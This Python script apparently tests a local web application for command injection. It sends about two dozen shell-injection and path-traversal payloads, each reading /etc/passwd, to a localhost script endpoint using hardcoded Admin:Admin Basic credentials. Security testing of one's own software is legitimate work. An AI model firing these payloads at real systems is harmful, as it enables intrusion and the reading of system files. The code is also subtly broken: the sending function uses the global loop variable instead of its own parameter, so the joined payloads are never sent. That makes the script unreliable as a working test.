from urllib.request import urlopen, Request
from json import dumps, loads


def send_RCE(injection):
    body["arguments"]["--names"]["value"] = test
    response = urlopen(
        Request(
            "http://127.0.0.1:8000/api/scripts/view_users.py",
            method="POST",
            headers={"Authorization": "Basic QWRtaW46QWRtaW4="},
            data=dumps(body).encode("latin-1"),
        )
    )

    print(f"[+] Injection: {injection}")
    print(f"[*] Response: {loads(response.read())}")


tests_RCE = [
    [";", "cat", " ", "/etc/passwd"],
    ["|", "cat", " ", "/etc/passwd"],
    ["&&", "cat", " ", "/etc/passwd"],
    ["\n", "cat", " ", "/etc/passwd"],
    ["&&", "cat", " ", "/etc/passwd", "&&"],
    [";", "cat", " ", "/etc/passwd", ";"],
    ["|", "cat", " ", "/etc/passwd", "|"],
    [";", "cat", " ", "/etc/passwd", "|"],
    ["\n", "cat", " ", "/etc/passwd", "\n"],
    ["\\etc\\passwd"],
    [".|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd"],
    ["../../../../../../../bin/cat", " ", "/etc/passwd", "|"],
    ['"', ";", "system(cat /etc/passwd);"],
    ["`cat /etc/passwd`"],
    [";", "system('cat /etc/passwd')"],
    ["&&", "system('cat /etc/passwd')"],
    ["|", "system('cat /etc/passwd')"],
    ["|", "system('cat /etc/passwd');"],
    ["perl", " ", "-e" '''"system('cat /etc/passwd');"''', "\n'"],
    ["/bin/cat", "/etc/passwd", "|", "'\n'"],
    ["/bin/cat", "/etc/passwd", "|'"],
    ['system("cat /etc/passwd")', ";", "die"],
    ['";cat /etc/passwd;echo "'],
]

body = {
    "arguments": {
        "--ids": {"value": "", "input": False},
        "--names": {"value": "", "input": False},
    }
}

print("[!] Start tests RCE (Remote Code Execution)... ")
for test in tests_RCE:
    send_RCE(test)
    send_RCE("".join(test))
print("[!] End.")
